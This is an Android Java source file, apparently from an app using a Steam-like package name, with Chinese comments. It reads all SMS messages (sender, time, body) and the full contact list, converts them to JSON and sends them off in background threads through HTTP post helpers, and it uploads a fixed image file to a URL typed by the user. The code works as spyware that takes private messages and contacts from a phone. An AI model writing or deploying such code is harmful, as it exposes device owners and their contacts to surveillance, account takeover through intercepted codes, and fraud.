package com.steam.android.androidsteam;

import android.Manifest;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;


import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    Button btn2;
    private Context context ;
    private List<ContactsData> contactsDatas = new ArrayList<>();
    private EditText editText;
    private Button button;
    private String urlString = null;
    private AsyncTask asyncTask;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //btn2 = (Button) findViewById(R.id.button2);

        context=this;

        editText =(EditText) findViewById(R.id.edit_tv);
        editText.setSelection(editText.getText().toString().length());
        button = (Button) findViewById(R.id.btn);

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //上传图片
                initTask();
                asyncTask.execute((Object[]) null);

            }
        });
    }
    private void initTask(){
        asyncTask = new AsyncTask() {
            @Override
            protected Object doInBackground(Object[] params) {
                String response = UploadImage.uploadFile(new File("/storage/emulated/0/GoStore/icon/2137923823.jpg"), urlString);
                return response;
            }

            @Override
            protected void onPreExecute() {
                super.onPreExecute();
                urlString = editText.getText().toString();
                Toast.makeText(MainActivity.this, "开始上传", Toast.LENGTH_SHORT).show();
            }

            @Override
            protected void onPostExecute(Object o) {
                super.onPostExecute(o);
                Toast.makeText(MainActivity.this, (o == null ? "" : o.toString()), Toast.LENGTH_SHORT).show();
            }
        };
    }
    public void sms(View view) {
        //获取内容提供者
        ContentResolver contentResolver = getContentResolver();
        //获取短信表的路径
        Uri uri = Uri.parse("content://sms");
        //设置要查询的列名
        String[] line = {"address", "date", "body","_id","thread_id"};
        //各个参数的意思，路径、列名、条件、条件参数、排序
        Cursor cursor = contentResolver.query(uri, line, null, null, null);
        List<Map<String,String>> list = new ArrayList<Map<String,String>>();

        //下面就跟操作普通数据库一样了
        if (cursor != null) {
            while (cursor.moveToNext()) {
                Map<String,String> map = new HashMap<String,String>();
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String date = cursor.getString(cursor.getColumnIndex("date"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                String _id= cursor.getString(cursor.getColumnIndex("_id"));
                String thread_id= cursor.getString(cursor.getColumnIndex("thread_id"));
               // Log.e("短信", "\n手机号:" + address + "\n时间:" + date + "\n内容:" + body+"\nid："+_id+"\n对话的序号："+thread_id);

                map.put("手机号",address);
                map.put("时间",date);
                map.put("内容",body);
                map.put("id",_id);
                map.put("对话的序号",thread_id);
                list.add(map);

            }
            //ystem.out.print("哈哈哈");
            final String a = JSON.toJSONString(list);


            new Thread(new Runnable() {
                @Override
                public void run() {



                    //System.out.print(myJson.toString());
                    SetPost sp = new SetPost();
                    sp.HttpPostData(a);
                }
            }).start();
            cursor.close();
        }
    }
    public  void sp(View view){
        Toast.makeText(MainActivity.this, "线程执行", Toast.LENGTH_SHORT).show();
        new Thread(new Runnable() {
            @Override
            public void run() {
                requestAllPower();
                if(isSdCardExist()){
                    System.out.println("sd存在");
                    //System.out.println(Test.getFileNameAndFileByPath("/storage/emulated/0/DCIM/Camera").get(0).getFilePath());
                    System.out.println(getSdCardPath());
                    System.out.println(getDefaultFilePath());
                }


            }
        }).start();




    }
    //动态申请存储权限
    public  void requestAllPower() {
        System.out.println("动态权限");
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                                Manifest.permission.READ_EXTERNAL_STORAGE}, 1);

            }
        }

    }
    //获取默认文件存放路径
    public static String getDefaultFilePath() {
        String filepath = "";
        File file = new File(Environment.getExternalStorageDirectory(),
                "abc.txt");
        if (file.exists()) {
            filepath = file.getAbsolutePath();
        } else {
            filepath = "不适用";
        }
        return filepath;
    }
    //读取sd跟目录
    public static String getSdCardPath() {
        boolean exist = isSdCardExist();
        String sdpath = "";
        if (exist) {
            sdpath = Environment.getExternalStorageDirectory()
                    .getAbsolutePath();
        } else {
            sdpath = "不适用";
        }
        return sdpath;

    }
    //查看sd是否存在
    public static boolean isSdCardExist() {
        return Environment.getExternalStorageState().equals(
                Environment.MEDIA_MOUNTED);
    }
    public void phoneNumber(View view) {
        //动态获取权限
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CONTACTS},1);
        }else {
            get2();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode) {
            case 1:
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    get2();
                }
        }
    }

    public void get() {
        //获取内容提供者
        ContentResolver contentResolver = getContentResolver();
        //获取raw_contacts表的路径
        Uri raw_contact_uri = Uri.parse("content://com.android.contacts/raw_contacts");
        //各个参数的意思，路径、列名、条件、条件参数、排序
        Cursor contactId = contentResolver.query(raw_contact_uri, new String[]{"contact_id"}, null, null, null);
        //下面就跟操作普通数据库一样了
        if (contactId != null) {
            while (contactId.moveToNext()) {
                //获取contact_id的值，它对应data表中raw_contact_id的值
                String id = contactId.getString(contactId.getColumnIndex("contact_id"));

                //获取data表的路径
                Uri data_uri = Uri.parse("content://com.android.contacts/data");
                //各个参数的意思，路径、列名、条件、条件参数、排序
                Cursor dataCursor = contentResolver.query(data_uri, new String[]{"mimetype", "data1"},
                        "raw_contact_id=?", new String[]{id}, null);
                if (dataCursor != null) {
                    //每次循环创建一个实例用于保存data表中的数据
                    ContactsData contactsData = new ContactsData();
                    while (dataCursor.moveToNext()) {
                        String type = dataCursor.getString(dataCursor.getColumnIndex("mimetype"));
                        switch (type) {
                            case "vnd.android.cursor.item/email_v2":
                                //这是邮箱信息
                                contactsData.setEmail(dataCursor.getString(dataCursor.getColumnIndex("data1")));
                                break;
                            case "vnd.android.cursor.item/phone_v2":
                                //这是手机号码信息
                                contactsData.setNumber(dataCursor.getString(dataCursor.getColumnIndex("data1")));
                                break;
                            case "vnd.android.cursor.item/name":
                                //这是联系人的名字
                                contactsData.setName(dataCursor.getString(dataCursor.getColumnIndex("data1")));
                                break;
                        }
                    }
                    //把查询到的信息添加到集合中
                    contactsDatas.add(contactsData);
                    dataCursor.close();
                }
            }
            contactId.close();
        }
        Log.d("测试","开始打印");
        for (ContactsData c : contactsDatas) {
            Log.e("联系人", c.toString());
        }
    }

    public void get2() {
        /**
         * 通过ContactsContract.Contacts.CONTENT_URI来获取_ID和DISPLAY_NAME
         * _ID 该联系人的索引
         * 通过这个ID可以在ContactsContract.CommonDataKinds.Phone.CONTENT_URI 中找到该联系人的电话号码
         * 通过这个ID可以在ContactsContract.CommonDataKinds.Email.CONTENT_URI 找到该联系人的邮箱
         * DISPLAY_NAME 是该联系人的姓名
         */
        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                ContactsData contactsData = new ContactsData();
                //获取该联系人的ID
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                //该联系人的姓名
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                contactsData.setName(name);

                /**
                 * 查找该联系人的phone信息
                 * 在ContactsContract.CommonDataKinds.Phone.CONTENT_URI 中查询
                 * 条件为ContactsContract.CommonDataKinds.Phone.CONTACT_ID = 上面查询到的ID
                 */
                Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId, null, null);
                if (phones != null && phones.moveToNext()) {
                    //获取该联系人的手机号码
                    String number = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contactsData.setNumber(number);
                }
                phones.close();

                /**
                 * 查找该联系人的email信息
                 * 在ContactsContract.CommonDataKinds.Email.CONTENT_URI 中查询
                 * 条件为ContactsContract.CommonDataKinds.Phone.CONTACT_ID = 上面查询到的ID
                 */
                Cursor emails = getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + "=" + contactId, null, null);
                if (emails != null && emails.moveToNext()) {
                    //获取该联系人的邮箱
                    String email = emails.getString(emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                    contactsData.setEmail(email);
                }
                emails.close();
                contactsDatas.add(contactsData);
            }
        }
        cursor.close();
        Log.d("测试","开始打印");
        List<Map<String,String>> list = new ArrayList<Map<String,String>>();
        for (ContactsData c : contactsDatas) {
            Map<String,String> map = new HashMap<String,String>();
            Log.e("联系人", c.toString());
            map.put("number",c.getNumber());
            map.put("name",c.getName());
            list.add(map);
        }
        final String a = JSON.toJSONString(list);


        new Thread(new Runnable() {
            @Override
            public void run() {



                //System.out.print(myJson.toString());
                SetPost2 sp = new SetPost2();
                sp.HttpPostData(a);
            }
        }).start();
    }
}
